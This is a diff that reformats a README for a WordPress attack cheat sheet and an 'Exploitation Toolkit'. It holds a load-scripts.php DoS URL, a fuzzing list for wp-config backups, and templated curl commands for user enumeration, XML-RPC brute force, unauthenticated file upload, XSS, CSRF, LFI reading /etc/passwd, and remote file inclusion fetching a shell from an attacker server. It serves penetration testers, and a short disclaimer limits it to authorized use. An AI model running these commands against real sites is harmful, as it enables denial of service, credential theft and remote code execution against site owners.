@@ -1,76 +1,79 @@
 Hello there,
 its still updateing its just a small demo.
 
-##Basic Endpoints 
+## Basic Endpoints
 
-##Check basic things :  
+## Check basic things :  
+
 common enpoints
-	wp-contents
-	wp-includes
-	wp-admin
+ wp-contents
+ wp-includes
+ wp-admin
 
-##DOS 
-	http://example.com/wp-admin/load-scripts.php?load=react,react-dom,moment,lodash,wp-polyfill-fetch,wp-polyfill-formdata,wp-polyfill-node-contains,wp-polyfill-url,wp-polyfill-dom-rect,wp-polyfill-element-closest,wp-polyfill,wp-block-library,wp-edit-post,wp-i18n,wp-hooks,wp-api-fetch,wp-data,wp-date,editor,colorpicker,media,wplink,link,utils,common,wp-sanitize,sack,quicktags,clipboard,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-reply,json2,underscore,backbone,wp-util,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrate,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,esprima,jshint,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-bar,wplink,wpdialogs,word-count,media-upload,hoverIntent,hoverintent-js,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embed,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,site-health,privacy-tools,updates,farbtastic,iris,wp-color-picker,dashboard,list-revisions,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
+## DOS
 
-##Information leaks : 
-	http://target.com/wp-json/wp/v2/users
-	http://target.com/?rest_route=/wp/v2/users
+ http://example.com/wp-admin/load-scripts.php?load=react,react-dom,moment,lodash,wp-polyfill-fetch,wp-polyfill-formdata,wp-polyfill-node-contains,wp-polyfill-url,wp-polyfill-dom-rect,wp-polyfill-element-closest,wp-polyfill,wp-block-library,wp-edit-post,wp-i18n,wp-hooks,wp-api-fetch,wp-data,wp-date,editor,colorpicker,media,wplink,link,utils,common,wp-sanitize,sack,quicktags,clipboard,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-reply,json2,underscore,backbone,wp-util,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrate,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,esprima,jshint,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-bar,wplink,wpdialogs,word-count,media-upload,hoverIntent,hoverintent-js,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embed,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,site-health,privacy-tools,updates,farbtastic,iris,wp-color-picker,dashboard,list-revisions,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter
 
-##Registration Enabled: 
-	/wp-login.php?action=register
-	
+## Information leaks :
 
+ http://target.com/wp-json/wp/v2/users
+ http://target.com/?rest_route=/wp/v2/users
 
-##FUZZING LIST : 
-	wp-includes
-	wp-content/uploads
-	wp-content/debug.log
-	Wp-load
-	Wp-json
-	index.php
-	wp-login.php
-	wp-links-opml.php
-	wp-activate.php
-	wp-blog-header.php
-	wp-cron.php
-	wp-links.php
-	wp-mail.php
-	xmlrpc.php
-	wp-settings.php
-	wp-trackback.php
-	wp-ajax.php
-	wp-admin.php
-	wp-config.php
-	.wp-config.php.swp
-	wp-config.inc
-	wp-config.old
-	wp-config.txt
-	wp-config.html
-	wp-config.php.bak
-	wp-config.php.dist
-	wp-config.php.inc
-	wp-config.php.old
-	wp-config.php.save
-	wp-config.php.swp
-	wp-config.php.txt
-	wp-config.php.zip
-	wp-config.php.html
-	wp-config.php~
-	/wp-admin/setup-config.php?step=1
-	/wp-admin/install.php
+## Registration Enabled:
 
+ /wp-login.php?action=register
+
+## FUZZING LIST :
+
+ wp-includes
+ wp-content/uploads
+ wp-content/debug.log
+ Wp-load
+ Wp-json
+ index.php
+ wp-login.php
+ wp-links-opml.php
+ wp-activate.php
+ wp-blog-header.php
+ wp-cron.php
+ wp-links.php
+ wp-mail.php
+ xmlrpc.php
+ wp-settings.php
+ wp-trackback.php
+ wp-ajax.php
+ wp-admin.php
+ wp-config.php
+ .wp-config.php.swp
+ wp-config.inc
+ wp-config.old
+ wp-config.txt
+ wp-config.html
+ wp-config.php.bak
+ wp-config.php.dist
+ wp-config.php.inc
+ wp-config.php.old
+ wp-config.php.save
+ wp-config.php.swp
+ wp-config.php.txt
+ wp-config.php.zip
+ wp-config.php.html
+ wp-config.php~
+ /wp-admin/setup-config.php?step=1
+ /wp-admin/install.php
 
 Most notable recent CVEs affecting WordPress plugins and core,
 
-##Plugins
-	WPSCAN
-	Nuclei 
-	Version based exploitation 
+## Plugins
 
-##Common Fuzzing 
-	seclist
-	randon-robbie (Wordpress-random)
+ WPSCAN
+ Nuclei
+ Version based exploitation
 
+## Common Fuzzing
+
+ seclist
+ randon-robbie (Wordpress-random)
 
 Few Notable CVE's
 CVE-2023-23488 - Vulnerability in "Paid Memberships Pro" plugin, allowing SQL injection.
@@ -104,10 +107,9 @@ CVE-2022-30991 - Directory Traversal in "WordPress REST API."
 CVE-2022-41456 - Unauthenticated SQL Injection in "Easy Digital Downloads."
 CVE-2022-35410 - SQL Injection in "WooCommerce Payments."
 
-
-
 Links to Explore more
-1. https://hackerone.com/reports/187520 
+
+1. https://hackerone.com/reports/187520
 2. https://hackerone.com/reports/460911
 3. https://hackerone.com/reports/487081
 4. https://hackerone.com/reports/487081
@@ -117,10 +119,6 @@ Links to Explore more
 8. https://www.hostinger.in/tutorials/how-to-secure-wordpress?utm_campaign=Generic-Tutorials-DSA|NT:Se|LO:IN-t3&utm_medium=ppc&gad_source=1
 9. https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress
 10. https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xss.md (Cheatsheet)
-
-
-
-
 
 # ⚠️ WordPress Exploitation Toolkit
 
@@ -140,14 +138,17 @@ This repository contains a collection of Proof of Concepts (PoCs) for exploiting
 ### 1. Username Enumeration
 
 #### Description
+
 Extracts a list of usernames using the WordPress REST API.
 
 #### ✔ Command
+
 ```bash
 curl -s "http://[TARGET_DOMAIN]/wp-json/wp/v2/users" | jq
 ```
 
 #### Expected Output
+
 A JSON object containing user IDs and usernames.
 
 ---
@@ -155,9 +156,11 @@ A JSON object containing user IDs and usernames.
 ### 2. XML-RPC Pingback Abuse
 
 #### Description
+
 Abuses the XML-RPC `pingback.ping` method to potentially find vulnerable endpoints or for DDoS amplification.
 
 #### ✔ Command
+
 ```bash
 curl -X POST "http://[TARGET_DOMAIN]/xmlrpc.php" -d '<?xml version="1.0"?>
 <methodCall>
@@ -170,6 +173,7 @@ curl -X POST "http://[TARGET_DOMAIN]/xmlrpc.php" -d '<?xml version="1.0"?>
 ```
 
 #### Expected Output
+
 A response indicating whether the target site is vulnerable to pingback abuse.
 
 ---
@@ -177,14 +181,17 @@ A response indicating whether the target site is vulnerable to pingback abuse.
 ### 3. Plugin/Theme File Disclosure (if applicable)
 
 #### Description
+
 Some plugins/themes expose sensitive files, such as configuration or backup files.
 
 #### ✔ Command
+
 ```bash
 curl -s "http://[TARGET_DOMAIN]/wp-content/plugins/[PLUGIN_NAME]/debug.log"
 ```
 
 #### Expected Output
+
 Contents of the exposed file (if available).
 
 ---
@@ -192,14 +199,17 @@ Contents of the exposed file (if available).
 ### 4. Directory Listing (Misconfiguration)
 
 #### Description
+
 Checks for publicly accessible directories due to server misconfigurations.
 
 #### ✔ Command
+
 ```bash
 curl -s "http://[TARGET_DOMAIN]/wp-content/uploads/" | grep "<title>"
 ```
 
 #### Expected Output
+
 HTML content indicating a directory listing page.
 
 ---
@@ -207,9 +217,11 @@ HTML content indicating a directory listing page.
 ### 5. Password Brute Force (XML-RPC)
 
 #### Description
+
 Attempts to brute force login credentials via the XML-RPC method, which is commonly vulnerable to brute-force attacks.
 
 #### ✔ Command
+
 ```bash
 curl -X POST "http://[TARGET_DOMAIN]/xmlrpc.php" -d '<?xml version="1.0"?>
 <methodCall>
@@ -222,6 +234,7 @@ curl -X POST "http://[TARGET_DOMAIN]/xmlrpc.php" -d '<?xml version="1.0"?>
 ```
 
 #### Expected Output
+
 Response showing either a successful login or failure message.
 
 ---
@@ -229,14 +242,17 @@ Response showing either a successful login or failure message.
 ### 6. WP-Admin Path Brute Force
 
 #### Description
+
 Brute forces paths to access the wp-admin login page, useful for misconfigurations or hidden paths.
 
 #### ✔ Command
+
 ```bash
 curl -s -o /dev/null -w "%{http_code}" "http://[TARGET_DOMAIN]/wp-admin/"
 ```
 
 #### Expected Output
+
 A 200 status code if the wp-admin login page exists.
 
 ---
@@ -244,14 +260,17 @@ A 200 status code if the wp-admin login page exists.
 ### 7. Unauthenticated File Upload Vulnerability (Plugin/Theme)
 
 #### Description
+
 Some plugins/themes allow unauthenticated file uploads that could lead to Remote Code Execution (RCE) or web shell uploads.
 
 #### ✔ Command
+
 ```bash
 curl -F "file=@[FILE_PATH]" "http://[TARGET_DOMAIN]/wp-content/plugins/[PLUGIN_NAME]/upload.php"
 ```
 
 #### Expected Output
+
 Confirmation that the file was uploaded or error message.
 
 ---
@@ -259,14 +278,17 @@ Confirmation that the file was uploaded or error message.
 ### 8. WP-Config File Disclosure
 
 #### Description
+
 Exploits a misconfiguration to expose the `wp-config.php` file, which contains sensitive database credentials.
 
 #### ✔ Command
+
 ```bash
 curl -s "http://[TARGET_DOMAIN]/wp-config.php"
 ```
 
 #### Expected Output
+
 Contents of the `wp-config.php` file, revealing database credentials.
 
 ---
@@ -274,14 +296,17 @@ Contents of the `wp-config.php` file, revealing database credentials.
 ### 9. Admin Login Page Bypass (if applicable)
 
 #### Description
+
 Bypasses login pages through known misconfigurations or vulnerabilities.
 
 #### ✔ Command
+
 ```bash
 curl -X POST "http://[TARGET_DOMAIN]/wp-login.php" -d "log=[USERNAME]&pwd=[PASSWORD]&wp-submit=Log+In&redirect_to=http%3A%2F%2F[TARGET_DOMAIN]%2Fwp-admin%2F"
 ```
 
 #### Expected Output
+
 Response showing if the login was successful.
 
 ---
@@ -289,14 +314,17 @@ Response showing if the login was successful.
 ### 10. Cross-Site Scripting (XSS) in Plugins
 
 #### Description
+
 Exploits XSS vulnerabilities in WordPress plugins by injecting malicious JavaScript into vulnerable plugin fields.
 
 #### ✔ Command
+
 ```bash
 curl -X POST "http://[TARGET_DOMAIN]/wp-admin/options-general.php?page=[PLUGIN_PAGE]" -d "setting=<script>alert('XSS')</script>"
 ```
 
 #### Expected Output
+
 JavaScript alert showing the XSS payload execution.
 
 ---
@@ -304,14 +332,17 @@ JavaScript alert showing the XSS payload execution.
 ### 11. Cross-Site Request Forgery (CSRF) in Admin Actions
 
 #### Description
+
 Exploits CSRF vulnerabilities by forcing an admin user to perform unintended actions on their WordPress site.
 
 #### ✔ Command
+
 ```bash
 curl -X POST "http://[TARGET_DOMAIN]/wp-admin/admin-post.php" -d "action=[ACTION_NAME]&[PARAMETERS]"
 ```
 
 #### Expected Output
+
 Admin action is performed without proper authentication.
 
 ---
@@ -319,14 +350,17 @@ Admin action is performed without proper authentication.
 ### 12. Local File Inclusion (LFI) via URL Parameters
 
 #### Description
+
 Exploits LFI vulnerabilities through URL parameters to include sensitive files like `/etc/passwd` or `wp-config.php`.
 
 #### ✔ Command
+
 ```bash
 curl -s "http://[TARGET_DOMAIN]/wp-content/themes/[THEME_NAME]/[VULNERABLE_FILE].php?page=../../../../../../etc/passwd"
 ```
 
 #### Expected Output
+
 Contents of the sensitive file, like `/etc/passwd`.
 
 ---
@@ -334,14 +368,17 @@ Contents of the sensitive file, like `/etc/passwd`.
 ### 13. Remote File Inclusion (RFI)
 
 #### Description
+
 Exploits vulnerable include statements to execute remote files, typically used for web shell uploads or remote code execution.
 
 #### ✔ Command
+
 ```bash
 curl -s "http://[TARGET_DOMAIN]/wp-content/themes/[THEME_NAME]/[VULNERABLE_FILE].php?file=http://[ATTACKER_SERVER]/shell.php"
 ```
 
 #### Expected Output
+
 The remote shell being executed on the target server.
 
 ---
@@ -349,14 +386,17 @@ The remote shell being executed on the target server.
 ### 14. Insecure Deserialization
 
 #### Description
+
 Exploits insecure deserialization vulnerabilities in WordPress plugins or themes that fail to properly validate user inputs.
 
 #### ✔ Command
+
 ```bash
 curl -X POST "http://[TARGET_DOMAIN]/wp-admin/admin-ajax.php" -d "action=deserialize&data=[MALICIOUS_PAYLOAD]"
 ```
 
 #### Expected Output
+
 Successful deserialization leading to code execution or privilege escalation.
 
 ---
@@ -376,6 +416,7 @@ This toolkit is for educational and authorized penetration testing purposes only
 ## 💰 Support Me  
 
 If you find this work helpful, you can support me:  
+
 - [![Buy Me a Coffee](https://www.buymeacoffee.com/assets/img/custom_images/yellow_img.png)](https://buymeacoffee.com/ghost_sec)  
 
 Thanks for your support! ❤️
